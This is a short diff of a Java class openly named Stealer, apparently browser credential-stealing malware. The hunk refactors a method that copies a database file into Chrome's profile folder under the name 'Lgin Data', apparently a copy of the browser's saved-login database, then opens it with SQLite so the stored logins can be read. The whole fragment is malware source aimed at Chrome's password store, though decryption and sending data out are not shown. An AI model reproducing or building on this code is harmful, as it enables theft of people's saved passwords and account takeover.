@@ -16,12 +16,11 @@ public class Stealer
 
     private static Connection connect() throws SQLException, ClassNotFoundException, IOException
     {
-         String dbLocation = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Lgin Data";
-         if(!new File(dbLocation).exists())
-         {
-            File file = new File(db);
-            Files.copy(file.toPath(), Paths.get(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Lgin Data"));
-         }
+            String dbLocation = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Lgin Data";
+            if(!new File(dbLocation).exists())
+            {
+               Files.copy(Paths.get(db), Paths.get(dbLocation));
+            }
             Class.forName("org.sqlite.JDBC");
             String url = "jdbc:sqlite:" + dbLocation;
             return DriverManager.getConnection(url);
